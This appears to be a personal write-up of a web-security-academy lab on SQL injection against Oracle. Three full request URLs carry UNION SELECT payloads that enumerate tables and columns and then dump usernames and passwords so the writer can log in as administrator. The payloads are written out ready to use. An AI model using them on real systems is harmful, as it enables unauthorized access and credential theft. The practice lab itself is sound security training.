# SQL injection attack, listing the database contents on Oracle

1. Send the following request to get all tables

```
https://0afd00e103d85bc18032175d003f00e8.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+null,table_name+FROM+all_tables--+-
```

![[attachments/sqli-lab-6/file-20260206135416495.png]]

2. Get all column names from the users table

```
https://0afd00e103d85bc18032175d003f00e8.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+null,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_DOXRKC'--+-
```

![[attachments/sqli-lab-6/file-20260206135416502.png]]

3. Get the data from the users table

```
https://0afd00e103d85bc18032175d003f00e8.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+USERNAME_VFECVZ,PASSWORD_FKWOAV+FROM+USERS_DOXRKC--+-
```

![[attachments/sqli-lab-6/file-20260206135416503.png]]

4. Log in as the administrator to solve the lab
